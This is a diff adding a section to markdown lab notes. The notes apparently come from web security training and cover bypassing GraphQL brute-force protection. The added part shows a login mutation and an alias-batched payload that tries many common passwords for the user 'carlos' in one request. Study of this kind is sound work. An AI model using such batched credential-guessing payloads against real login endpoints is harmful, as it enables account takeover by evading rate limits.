@@ -140,3 +140,14 @@ query {
 }
 ```
  -  `postPassword` is unique field, so turbo intruder with `postPassword` added to graphql fields, get the password.
+
+##### Lab: Bypassing GraphQL brute force protections
+ - First login was like this
+```
+{"query":"\n    mutation login($input: LoginInput!) {\n        login(input: $input) {\n            token\n            success\n        }\n    }","operationName":"login","variables":{"input":{"username":"wiener","password":"peter"}}}
+```
+ - With alias burte force it becomes like this
+```
+{"query": "mutation{login0:login(input:{username:\"carlos\", password:\"123456\"}){token\n success}\nlogin1:login(input:{username:\"carlos\", password:\"password\"}){token\n success}\nlogin2:login(input:{username:\"carlos\", password:\"12345678\"}){token\n success}\nlogin3:login(input:{username:\"carlos\", password:\"qwerty\"}){token\n success}\nlogin4:login(input:{username:\"carlos\", password:\"123456789\"}){token\n success}  ... }"}
+```
+ - Script appended here.
